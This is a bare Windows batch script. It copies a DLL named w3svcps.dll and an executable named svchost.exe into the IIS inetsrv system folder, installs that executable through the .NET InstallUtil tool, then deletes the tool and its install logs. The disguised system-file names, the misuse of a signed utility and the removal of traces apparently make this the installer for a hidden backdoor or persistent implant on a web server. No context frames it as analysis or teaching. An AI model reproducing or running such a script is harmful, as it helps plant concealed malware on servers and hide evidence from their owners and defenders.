copy w3svcps.dll C:\WINDOWS\system32\inetsrv
copy svchost.exe C:\WINDOWS\system32\inetsrv
copy svchost.exe.config C:\WINDOWS\system32\inetsrv
copy InstallUtil.exe C:\WINDOWS\system32\inetsrv
C:\WINDOWS\system32\inetsrv\InstallUtil.exe C:\WINDOWS\system32\inetsrv\svchost.exe
del C:\WINDOWS\system32\inetsrv\InstallUtil.exe
del C:\WINDOWS\system32\inetsrv\svchost.InstallLog
del C:\WINDOWS\system32\inetsrv\svchost.InstallState
del InstallUtil.InstallLog